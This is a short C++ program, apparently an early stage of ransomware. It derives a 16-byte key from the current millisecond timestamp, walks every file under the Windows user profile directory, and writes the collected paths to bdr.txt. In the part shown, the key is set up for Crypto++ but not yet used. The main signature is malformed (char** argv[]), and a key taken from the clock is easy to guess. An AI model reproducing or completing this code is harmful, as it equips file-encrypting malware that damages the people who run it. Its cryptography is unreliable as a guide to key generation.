#define _CRT_SECURE_NO_WARNINGS
#include "includes.h"
using namespace CryptoPP;
int main(int argc, char** argv[]) {
	char* userprofile = getenv("USERPROFILE");
	std::string usrHome = std::string(userprofile);
	std::string keyStr = lars::logic::getUnixMs();
	if (keyStr.size() < 16) {
		keyStr.resize(16, '0');
	}
	if (keyStr.size() > 16) {
		keyStr.resize(16);
	}
	SecByteBlock keySbb(reinterpret_cast<const unsigned char*>(keyStr.data()), keyStr.size());
	fs::path path = usrHome.c_str();
	std::vector<fs::path> file_paths;
	lars::logic::collect_files(path, file_paths);
	std::ofstream file("bdr.txt");
	for (const auto& file_path : file_paths) {
		file << file_path << std::endl;
	}
	file.close();
	return 0;
}